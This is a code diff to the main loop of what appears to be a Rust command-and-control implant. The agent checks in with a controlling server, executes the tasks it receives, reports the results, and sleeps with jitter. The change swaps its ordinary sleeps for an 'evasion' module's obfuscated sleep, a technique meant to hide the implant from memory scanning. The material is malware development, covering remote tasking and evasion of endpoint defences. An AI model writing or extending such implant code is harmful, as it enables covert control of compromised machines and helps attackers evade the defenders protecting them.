@@ -27,20 +27,16 @@ pub async fn run(cfg: AgentConfig) -> Result<()> {
 
         match transport.checkin(&req).await {
             Ok(resp) => {
-                // Execute pending tasks
                 for task in resp.tasks {
                     let result = execute_task(&task).await;
                     let _ = transport.report_task(agent_id, &task, result).await;
                 }
-
-                // Jittered sleep
-                let sleep = jittered_sleep(resp.sleep_ms, resp.jitter_pct);
-                tokio::time::sleep(tokio::time::Duration::from_millis(sleep)).await;
+                let sleep_ms = jittered_sleep(resp.sleep_ms, resp.jitter_pct);
+                crate::evasion::obfuscated_sleep(sleep_ms, &cfg.sleep_obf).await;
             }
-            Err(e) => {
-                // Back-off on failure
+            Err(_) => {
                 let backoff = jittered_sleep(cfg.sleep_ms * 3, cfg.jitter_pct);
-                tokio::time::sleep(tokio::time::Duration::from_millis(backoff)).await;
+                crate::evasion::obfuscated_sleep(backoff, &cfg.sleep_obf).await;
             }
         }
     }
